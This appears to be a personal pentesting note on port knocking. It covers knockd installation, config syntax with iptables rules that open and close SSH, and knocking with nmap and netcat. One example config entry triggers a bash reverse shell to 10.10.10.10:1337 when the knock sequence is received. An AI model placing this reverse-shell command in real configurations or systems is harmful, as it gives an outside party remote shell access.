# Port Knocking

[As a security conecpt is has positives and negatives but generally consider bad](https://security.stackexchange.com/questions/1194/port-knocking-is-it-a-good-idea), MITM attacks sniff packets or if the knock-daemon fails via log file mismanagement.

## Knock
```bash
apt-get install knockd
knock $ip $ports-space-seperated
```

Configure syntax
```bash
[options]
		logfile = /var/log/knockd.log
# Example
[Name]
		sequence = 455,15,31337
		seq_timeout = 15
		command = /bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'
		tcpflags = syn
# Open and Close SSH
[OpenSSH]
		sequence = 69,15,1337
		seq_timeout = 15
		command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
		tcpflags = syn
[CloseSSH]
		sequence = 31337,8008,8008
		seq_timeout = 15
		command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
		tcpflags = syn
```

```bash
sudo /etc/init.d/knockd restart
```

## Nmap/bash
Refactored one-liner provided by[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html) into a script found at my [AllTheHackingScripts]()
```bash
# Set $IP and replace $X with port number to knock
for port in $X; do nmap -Pn --host_timeout 201 --max-retries 0 -p $port $IP; done;
```

## Netcat
```bash
nc $IP $PORT
nc $IP $PORT
nc $IP $PORT
nc $IP $PORT
```

## References

[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html)